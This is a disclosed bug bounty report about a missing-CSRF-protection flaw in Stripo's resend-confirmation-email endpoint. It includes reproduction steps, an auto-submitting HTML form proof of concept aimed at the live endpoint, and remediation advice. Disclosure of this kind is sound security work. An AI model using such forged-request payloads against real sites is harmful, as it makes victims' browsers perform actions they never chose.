# No CSRF Protection in Resend Confirmation Email feature leads to Sending Unwanted Email in Victim's Inbox without knowing Victim's email address

## Report Details
- **Report ID**: 753386
- **URL**: https://hackerone.com/reports/753386
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2019-12-06T20:57:52.849Z
- **Disclosed**: 2020-09-08T11:17:01.487Z

## Reporter
- **Username**: whoisbinit
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: stripo

## Vulnerability Information
## Summary:
There's no CSRF protection in confirmation email resending feature as a result of which an attacker can trick the victim to receive a confirmation email unknowingly. In other features of the website, the content-type must be "application/json", and there is same-origin policy, which prevents CSRF, but in this one, it isn't necessary to have the content-type "application/json", as a result of which the "resendEmailConfirmation" endpoint becomes vulnerable to CSRF.

## Steps To Reproduce:
Step 1. Login to your unverified Stripo account, and then intercept the request made while clicking on the "Resend it" text at the top-right corner of the webpage. The HTTP Request would look like this:
Request URL: https://my.stripo.email/cabinet/stripeapi/v1/resendEmailConfirmation
Request Method: POST
Request Data: {}
Step 2. With the obtained information, create a HTML code like this:
```
<body onload="document.form.submit()">
<form name="form" method="POST" action="https://my.stripo.email/cabinet/stripeapi/v1/resendEmailConfirmation">
</form>
</body>
```
Step 3. Save the file with .html extension, upload it to your website, and send the URL to the victim.
When the victim visits the URL, the request is made automatically from victim's account

### Example URL: https://binitghimire.com.np/stripo/resendEmail.html

This is how this vulnerability can be reproduced.

## Remediation Actions
In accordance with the current situation of the website, the vulnerability can be fixed by making the "application/json" content-type compulsory in requests, and optionally passing certain data in the HTTP request so that the reproduction would be impossible, unless the `enctype="application/json"` feature is introduced in higher versions of HTML, and other things would be handled by the existing Same-origin Policy just like in the other features of the website. If the Same-origin Policy hadn't existed, an attacker would have been able to, for example, put any image as someone's profile photo or delete anyone's profile photo, but this doesn't exist, all thanks to the SOP and the content-type "application/json" necessity.

Another way to fix the vulnerability is to introduce the CSRF token system, if you are thinking about bringing a change to the Stripo platform.

## Supporting Material/References:
  * An image has been attached along with this vulnerability report.

## Impact

As a result of this vulnerability, an attacker would be able to lead the victim in receiving confirmation email without even knowing and without clicking any buttons or filling up any details.

I would be looking forward to hearing from you soon.

Thanks,
@binit

## Attachments
- Result_of_CSRF.png
